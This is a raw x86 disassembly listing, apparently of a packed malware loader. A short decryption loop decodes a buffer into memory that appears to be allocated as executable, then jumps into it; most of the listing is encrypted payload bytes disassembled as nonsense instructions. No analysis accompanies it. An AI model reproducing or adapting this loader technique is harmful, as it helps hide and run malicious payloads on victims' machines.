  4214c7:	fimul  DWORD PTR [edi]
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0x80b28cd2
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0xfc2ac30c
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	(bad)  
  42182e:	in     eax,dx
  42182f:	pusha  
  421830:	push   ds
  421831:	fidivr DWORD PTR [esi-0x52]
  421834:	adc    cl,BYTE PTR [edx+0x41dc5fbf]
  42183a:	retf   0x3a5f
  42183d:	mov    fs,WORD PTR [edx+0x7d]
  421840:	scas   al,BYTE PTR es:[edi]
  421841:	adc    cl,BYTE PTR [edx+0x1dc5fbb]
  421847:	xor    eax,0xda8e3aa0
  42184c:	jge    0x4217fc
  42184e:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421854:	xor    eax,0xda8e3aa0
  421859:	jge    0x421809
  42185b:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421861:	xor    eax,0xda8e3aa0
  421866:	jge    0x421816
  421868:	adc    cl,BYTE PTR [edx+0x41dc5f43]
  42186e:	cmp    edi,DWORD PTR [edi-0x36257f80]
  421874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421875:	fild   QWORD PTR [ebx-0x736fa1fd]
  42187b:	adc    al,0xf4
  42187d:	push   edx
  42187e:	out    0xa9,eax
  421880:	pop    ebp
  421881:	fisub  WORD PTR [eax-0x1b]
  421884:	fsubr  QWORD PTR ds:0xc3152cbd
  42188a:	pop    ebx
  42188b:	loopne 0x421841
  42188d:	adc    bl,dl
  42188f:	xor    ch,al
  421891:	fidivr WORD PTR [edi-0x52]
  421894:	xor    al,0x5b
  421896:	adc    BYTE PTR [ebx-0x20],0xfa
  42189a:	cmp    ecx,esp
  42189c:	inc    ecx
  42189d:	stos   BYTE PTR es:[edi],al
  42189e:	(bad)  
  42189f:	xor    BYTE PTR [eax+0x37ad1b24],bh
  4218a5:	test   dh,bh
  4218a7:	jge    0x421857
  4218a9:	adc    cl,BYTE PTR [edx+0x46dc5fbb]
  4218af:	lods   al,BYTE PTR ds:[esi]
  4218b0:	pop    esp
  4218b1:	arpl   bp,cx
  4218b3:	and    ch,bh
  4218b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218b6:	push   ecx
  4218b7:	jb     0x4218e2
  4218b9:	push   ebp
  4218ba:	lahf   
  4218bb:	mov    ecx,0xeb62aaa7
  4218c0:	(bad)  
  4218c1:	ja     0x4218b4
  4218c3:	jmp    0x3f79:0xb907b118
  4218ca:	(bad)
  4218cf:	retf   
  4218d0:	sub    eax,DWORD PTR [eax+0x4b4ea7d3]
  4218d6:	sbb    DWORD PTR [esi],ebp
  4218d8:	add    eax,DWORD PTR [esp+ebx*4-0x3fe7c37b]
  4218df:	cmp    ecx,DWORD PTR [esi-0x2a]
  4218e2:	or     ecx,ebp
  4218e4:	xor    dh,BYTE PTR [eax]
  4218e6:	les    ebx,FWORD PTR [edx+0x7c]
  4218e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218ea:	dec    edx
  4218eb:	jb     0x421916
  4218ed:	push   ebp
  4218ee:	lahf   
  4218ef:	mov    ecx,0x7712aaa6
  4218f4:	dec    eax
  4218f5:	ja     0x421908
  4218f7:	retf   0xb10a
  4218fa:	adc    ah,BYTE PTR [ebx+edx*8]
  4218fd:	aas    
  4218fe:	clc    
  4218ff:	pop    edi
  421900:	mov    bl,0xd0
  421902:	jne    0x42195a
  421904:	add    BYTE PTR [eax+0x4bd43ae3],0x77
  42190b:	pop    eax
  42190c:	test   al,0x84
  42190e:	sbb    BYTE PTR [eax],0xa1
  421911:	sbb    al,cl
  421913:	inc    ebx
  421914:	int    0xd6
  421916:	adc    ebx,DWORD PTR [ebx+eax*8+0x52]
  42191a:	int    0x22
  42191c:	out    dx,eax
  42191d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42191e:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421924:	xor    eax,0xdacb6aa0
  421929:	jge    0x42190d
  42192b:	adc    ecx,DWORD PTR [eax+0x2a0cffbb]
  421931:	jp     0x4218d3
  421933:	cmp    cl,BYTE PTR [esi+0x12ae7dda]
  421939:	mov    bl,BYTE PTR [ebx+0x5f]
  42193c:	fild   WORD PTR [eax+0x3e]
  42193f:	mov    eax,ds:0x93da8e30
  421944:	stos   BYTE PTR es:[edi],al
  421945:	adc    cl,BYTE PTR [edx+0x41dc5907]
  42194b:	xor    eax,0x679f3aa0
  421950:	jge    0x421900
  421952:	adc    bl,BYTE PTR [edx+0x41dc5fbb]
  421958:	xor    BYTE PTR [eax+0x7d9b8e3a],ah
  42195e:	scas   al,BYTE PTR es:[edi]
  42195f:	add    cl,BYTE PTR [edx+0x41de5fbb]
  421965:	xor    eax,0xda8f3aa5
  42196a:	jge    0x42191a
  42196c:	adc    cl,BYTE PTR [edx+0x41dd5fbe]
  421972:	xor    eax,0xda8e3aa0
  421977:	sub    eax,0xbf8a12a2
  42197c:	pop    edi
  42197d:	fadd   QWORD PTR [eax-0x2f]
  421980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421981:	cmp    cl,BYTE PTR [edx+ebx*8-0x75edd183]
  421988:	stos   DWORD PTR es:[edi],eax
  421989:	pop    edi
  42198a:	fcom   QWORD PTR [ecx+0x35]
  42198d:	mov    al,ds:0x7dca8e3a
  421992:	scas   al,BYTE PTR es:[edi]
  421993:	add    cl,BYTE PTR [edx+0x41dc5fbb]
  421999:	xor    eax,0xda8e3ab0
  42199e:	jge    0x42194e
  4219a0:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  4219a6:	rcr    DWORD PTR [ecx+0x7eb38e36],0xae
  4219ad:	adc    cl,BYTE PTR [edx+0xedc544b]
  4219b3:	jl     0x421955
  4219b5:	cmp    cl,BYTE PTR [esi+0x12ae7dda]
  4219bb:	mov    bh,BYTE PTR [ebx+0x3541dc5f]
  4219c1:	mov    al,ds:0x7dda8e3a
  4219c6:	scas   al,BYTE PTR es:[edi]
  4219c7:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  4219cd:	xor    eax,0xda8e3aa0
  4219d2:	jge    0x421982
  4219d4:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  4219da:	xor    eax,0xda8e3aa0
  4219df:	jge    0x42198f
  4219e1:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  4219e7:	xor    eax,0xda8e3aa0
  4219ec:	jge    0x42199c
  4219ee:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  4219f4:	xor    eax,0xda8e3aa0
  4219f9:	jge    0x4219a9
  4219fb:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421a01:	xor    eax,0xda8e3aa0
  421a06:	jge    0x4219b6
  421a08:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421a0e:	xor    eax,0xda8e3aa0
  421a13:	jge    0x4219c3
  421a15:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421a1b:	xor    eax,0xaea03aa0
  421a20:	sbb    dh,dl
  421a22:	data16 mov bh,BYTE PTR [ebx+0x3ea1dc5f]
  421a29:	mov    al,ds:0x7dda9e3a
  421a2e:	scas   al,BYTE PTR es:[edi]
  421a2f:	(bad)  
  421a30:	mov    ?,WORD PTR [ebx+0x3541d85f]
  421a36:	lock jg 0x421a06
  421a39:	call   0x8a54fb67
  421a3e:	mov    ebx,0x1541dc5f
  421a43:	mov    al,ds:0xff46e3a
  421a48:	frstor [eax-0x17]
  421a4b:	mov    ebx,0x5541dc5f
  421a50:	mov    al,ds:0x762a8e3a
  421a55:	scas   al,BYTE PTR es:[edi]
  421a56:	adc    dl,al
  421a58:	mov    ebx,0x3199dc5f
  421a5d:	mov    al,ds:0x7dda8e3a
  421a62:	scas   al,BYTE PTR es:[edi]
  421a63:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421a69:	xor    eax,0x3a8e3a80
  421a6e:	jge    0x421a1e
  421a70:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421a76:	xor    eax,0xda8e3aa0
  421a7b:	jge    0x421a2b
  421a7d:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421a83:	xor    eax,0xda8e3aa0
  421a88:	jge    0x421a38
  421a8a:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421a90:	xor    eax,0xda8e3aa0
  421a95:	jge    0x421a45
  421a97:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421a9d:	xor    eax,0xda8e3aa0
  421aa2:	jge    0x421a52
  421aa4:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421aaa:	xor    eax,0xda8e3aa0
  421aaf:	jge    0x421a5f
  421ab1:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421ab7:	xor    eax,0xda8e3aa0
  421abc:	jge    0x421a6c
  421abe:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421ac4:	xor    eax,0xda8e3aa0
  421ac9:	jge    0x421a79
  421acb:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421ad1:	xor    eax,0xda8e3aa0
  421ad6:	jge    0x421a86
  421ad8:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421ade:	xor    eax,0xda8e3aa0
  421ae3:	jge    0x421a93
  421ae5:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421aeb:	xor    eax,0xda8e3aa0
  421af0:	jge    0x421aa0
  421af2:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421af8:	xor    eax,0xda8e3aa0
  421afd:	jge    0x421aad
  421aff:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421b05:	xor    eax,0xda8e3aa0
  421b0a:	jge    0x421aba
  421b0c:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421b12:	xor    eax,0xda8e3aa0
  421b17:	jge    0x421ac7
  421b19:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421b1f:	xor    eax,0xda8e3aa0
  421b24:	jge    0x421ad4
  421b26:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421b2c:	xor    eax,0xda8e3aa0
  421b31:	jge    0x421ae1
  421b33:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421b39:	xor    eax,0xda8e3aa0
  421b3e:	jge    0x421aee
  421b40:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421b46:	xor    eax,0xda8e3aa0
  421b4b:	jge    0x421afb
  421b4d:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421b53:	xor    eax,0xda8e3aa0
  421b58:	jge    0x421b08
  421b5a:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421b60:	xor    eax,0xda8e3aa0
  421b65:	jge    0x421b15
  421b67:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421b6d:	xor    eax,0xda8e3aa0
  421b72:	jge    0x421b22
  421b74:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421b7a:	xor    eax,0xda8e3aa0
  421b7f:	jge    0x421b2f
  421b81:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421b87:	xor    eax,0xda8e3aa0
  421b8c:	jge    0x421b3c
  421b8e:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421b94:	xor    eax,0xda8e3aa0
  421b99:	jge    0x421b49
  421b9b:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421ba1:	xor    eax,0xda8e3aa0
  421ba6:	jge    0x421b56
  421ba8:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421bae:	xor    eax,0xda8e3aa0
  421bb3:	jge    0x421b63
  421bb5:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421bbb:	xor    eax,0xda8e3aa0
  421bc0:	jge    0x421b70
  421bc2:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421bc8:	xor    eax,0xda8e3aa0
  421bcd:	jge    0x421b7d
  421bcf:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421bd5:	xor    eax,0xda8e3aa0
  421bda:	jge    0x421b8a
  421bdc:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421be2:	xor    eax,0xda8e3aa0
  421be7:	jge    0x421b97
  421be9:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421bef:	xor    eax,0xda8e3aa0
  421bf4:	jge    0x421ba4
  421bf6:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421bfc:	xor    eax,0xda8e3aa0
  421c01:	jge    0x421bb1
  421c03:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421c09:	xor    eax,0xda8e3aa0
  421c0e:	jge    0x421bbe
  421c10:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421c16:	xor    eax,0xda8e3aa0
  421c1b:	jge    0x421bcb
  421c1d:	adc    cl,BYTE PTR [edx+0x41dc5fbb]
  421c23:	xor    eax,0xda8e3aa0
  421c28:	jge    0x421bd8
  421c2a:	adc    cl,BYTE PTR [edx-0x164ca045]
  421c30:	mov    al,ds:0x6dda8e15
  421c36:	scas   al,BYTE PTR es:[edi]
  421c37:	adc    ah,BYTE PTR [eax+0x27ad8519]
  421c3d:	retf   0xa48d
  421c40:	or     DWORD PTR [edx-0x66056770],ecx
  421c46:	bswap  edx
  421c48:	mov    edx,0x29fab130
  421c4d:	aas    
  421c4e:	ins    DWORD PTR es:[edi],dx
  421c4f:	imul   eax,ebx,0xfffffff6
  421c52:	add    BYTE PTR [edx],bh
  421c54:	cdq    
  421c55:	repnz and esp,DWORD PTR [ebp-0x6a42fc61]
  421c5c:	int3   
  421c5d:	mov    ecx,0xf89c8a30
  421c62:	push   esp
  421c63:	adc    al,0x64
  421c65:	int    0x93
  421c67:	mov    esp,0xa3baa0e7
  421c6c:	jmp    0x7379:0xfaf881b4
  421c73:	jmp    DWORD PTR [ecx-0x25b1cde]
  421c79:	out    dx,al
  421c7a:	fwait
  421c7b:	cld    
  421c7c:	shl    DWORD PTR [eax-0x9807261],cl
  421c82:	pushf  
  421c83:	sub    al,0xed
  421c85:	fdivr  QWORD PTR [ebx]
  421c87:	std    
  421c88:	jbe    0x421c2b
  421c8a:	fdiv   QWORD PTR [edx+edi*8-0x917628]
  421c91:	popf   
  421c92:	jns    0x421d02
  421c94:	call   0x2e06:0x55cabdaf
  421c9b:	mov    ds:0x5986d63d,al
  421ca0:	ins    DWORD PTR es:[edi],dx
  421ca1:	test   bh,bh
  421ca3:	(bad)  
  421ca4:	push   ds
  421ca5:	xchg   DWORD PTR [edx],ebx
  421ca7:	jl     0x421cdb
  421ca9:	mov    eax,ds:0x753cec54
  421cae:	mov    ch,BYTE PTR [esi+0x10]
  421cb1:	idiv   BYTE PTR [edx]
  421cb3:	into   
  421cb4:	cwde   
  421cb5:	shl    BYTE PTR [edi+0x50],1
  421cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cb9:	push   edi
  421cba:	dec    esi
  421cbb:	cs push ss
  421cbd:	push   ebx
  421cbe:	jb     0x421d11
  421cc0:	mov    bl,0x4e
  421cc2:	or     edx,esi
  421cc4:	aas    
  421cc5:	repnz xchg esp,eax
  421cc7:	aaa    
  421cc8:	xchg   esi,eax
  421cc9:	lods   eax,DWORD PTR ds:[esi]
  421cca:	(bad)  
  421ccb:	int    0x64
  421ccd:	mov    eax,0x37758889
  421cd2:	pop    esi
  421cd3:	or     BYTE PTR [ebx],al
  421cd5:	sti    
  421cd6:	adc    ah,al
  421cd8:	ins    DWORD PTR es:[edi],dx
  421cd9:	or     DWORD PTR [edx-0x7e],0xfffffff4
  421cdd:	imul   bl
  421cdf:	pop    edi
  421ce0:	popf   
  421ce1:	loopne 0x421c6e
  421ce3:	dec    edx
  421ce4:	test   BYTE PTR [esi+0x40],0xcb
  421ce8:	enter  0xe43e,0xef
  421cec:	ins    DWORD PTR es:[edi],dx
  421ced:	fnstenv [esi-0x4e]
  421cf0:	inc    ecx
  421cf1:	pop    esi
  421cf2:	sub    eax,0x14
  421cf5:	sbb    DWORD PTR [ecx+0x75],esp
  421cf8:	mov    ds:0xeda29d7f,al
  421cfd:	xchg   ecx,eax
  421cfe:	add    ch,dl
  421d00:	and    bl,dl
  421d02:	pop    es
  421d03:	js     0x421cd9
  421d05:	cmp    bl,BYTE PTR [edx-0x4e]
  421d08:	cdq    
  421d09:	xor    dl,dh
  421d0b:	popa   
  421d0c:	(bad)  
  421d0d:	mov    ebp,0x2d6667a3
  421d12:	add    eax,0x5d985ebc
  421d17:	mov    eax,ds:0x28c51133
  421d1c:	dec    ebx
  421d1d:	gs retf 
  421d1f:	mov    DWORD PTR [edx-0xd],esi
  421d22:	stos   BYTE PTR es:[edi],al
  421d23:	fld    DWORD PTR [ebx-0x15b79a3b]
  421d29:	shl    DWORD PTR [edx+0x2195a559],cl
  421d2f:	fnstcw WORD PTR ds:0x91b60b33
  421d35:	adc    al,0xbc
  421d37:	and    al,0xc4
  421d39:	ss addr16 mov ebx,cs
  421d3d:	jnp    0x421db8
  421d3f:	adc    ah,dh
  421d41:	test   BYTE PTR [ebx],al
  421d43:	inc    esp
  421d44:	sub    al,BYTE PTR [eax-0x69e2ad13]
  421d4a:	or     BYTE PTR [eax+eiz*8-0x28],bl
  421d4e:	dec    ecx
  421d4f:	in     eax,dx
  421d50:	(bad)  
  421d52:	fisubr DWORD PTR [ecx+0x6cd17baf]
  421d58:	scas   al,BYTE PTR es:[edi]
  421d59:	dec    ebx
  421d5a:	dec    esi
  421d5b:	mov    al,0xda
  421d5d:	dec    BYTE PTR [edi-0x15]
  421d60:	xchg   BYTE PTR [esp+edx*8],ah
  421d63:	psubd  mm5,QWORD PTR [esi]
  421d66:	cmp    ebp,DWORD PTR [edi-0x11]
  421d69:	out    0xcb,eax
  421d6b:	aas    
  421d6c:	and    ebx,esp
  421d6e:	mov    edi,0xab018fdc
  421d73:	test   eax,0xef94f90f
  421d78:	(bad)  [edx]
  421d7a:	add    ebx,DWORD PTR [edx+0x5e]
  421d7d:	and    BYTE PTR [edx+0xdb3b5d3],cl
  421d83:	pop    DWORD PTR [edi+0x29]
  421d86:	inc    ecx
  421d87:	jae    0x421d09
  421d89:	and    ah,BYTE PTR [edx]
  421d8b:	rol    BYTE PTR [edx-0x130eaa3d],1
  421d91:	push   ds
  421d92:	imul   eax,DWORD PTR [ecx],0x15
  421d95:	mov    eax,ds:0x46fc184d
  421d9a:	and    al,0x14
  421d9c:	xor    ebp,DWORD PTR [ecx+edi*8]
  421d9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421da0:	sbb    al,0x10
  421da2:	fldenv [ebx+0x76c304e9]
  421da8:	(bad)  
  421da9:	icebp  
  421daa:	in     eax,dx
  421dab:	jno    0x421d5d
  421dad:	lods   al,BYTE PTR ds:[esi]
  421dae:	fsubr  QWORD PTR [edx+0x6c]
  421db1:	fistp  WORD PTR [edi+0x3b6c8808]
  421db7:	sub    DWORD PTR [edx+0x7fd78613],ebx
